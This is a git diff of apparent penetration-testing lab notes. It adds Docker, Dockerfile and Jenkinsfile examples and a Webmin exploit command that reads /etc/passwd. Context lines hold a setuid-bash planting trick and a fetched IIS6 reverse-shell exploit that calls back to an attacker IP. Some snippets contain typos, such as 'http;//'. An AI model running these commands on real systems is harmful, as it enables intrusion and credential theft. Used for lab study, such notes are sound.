@@ -12,6 +12,12 @@ Also, do check this notes here [https://github.com/aniqfakhrul/archives](https:/
 wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10
 ```
 
+### 22 (SSH)
+
+```bash
+
+```
+
 ### 25 (SMTP)
 
 ```bash
@@ -1319,6 +1325,58 @@ readpst file.pst
 cat file.mbox
 ```
 
+### Docker
+
+```bash
+# Commands
+docker images
+docker pull ubuntu
+docker run -it ubuntu
+docker run -it <image_id>
+docker build /path_to_Dockerfile/
+```
+
+### Dockerfile
+
+```bash
+#====Example====
+FROM node:7-onbuild
+LABEL maintainer "test@example.com"
+HEALTHCHECK --interval=5s \
+			--timeout=5s \
+			CMD curl -f http;//127.0.0.1:8000 || exit 1
+EXPOSE 8000
+
+#====Example====
+```
+
+### Jenkinsfile
+
+```bash
+#====Example====
+node {
+	def app
+	
+	stage('Clone repository'){
+		checkout scm
+	}
+	stage('Build iamge'){
+		app = docker.build("username/docker")
+	}
+	stage('Test image'){
+		app.inside {
+			sh 'echo "Tests passed"'
+		}
+	}
+	stage('Push image'){
+		docker.withRegistry('https://registry.hub.docker.com','docker-hub-credentials'){
+			app.push("$(env.BUILD_NUMBER)")
+			app.push("latest")
+		}
+	}
+}
+```
+
 # C. SUID/CAP/SUDO/GROUP
 
 ### LXD
@@ -1699,7 +1757,7 @@ echo "cp /bin/bash /tmp/bash;chmod 4777 /tmp/bash" > /tmp/update
 wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell -O exploit.py
 
 # Usage
-python exploit.py 10.10.10.14 80 10.10.14.23 443
+python exploit.py 10.10.10.10 80 10.10.10.20 443
 ```
 
 ### AlwaysInstall Elevated
@@ -2024,6 +2082,16 @@ https://github.com/haseebT/mRemoteNG-Decrypt.git
 # Commands
 python3 mremoteng_decrypt.py -s "<BASE64>"
 ```
+
+### Webmin
+
+```bash
+# < 1.290
+https://www.exploit-db.com/exploits/2017
+## Commands
+perl exploit.pl 10.10.10.10 10000 /etc/passwd 0
+```
+
 # F. Reverse Shell
 
 ### PowerShell
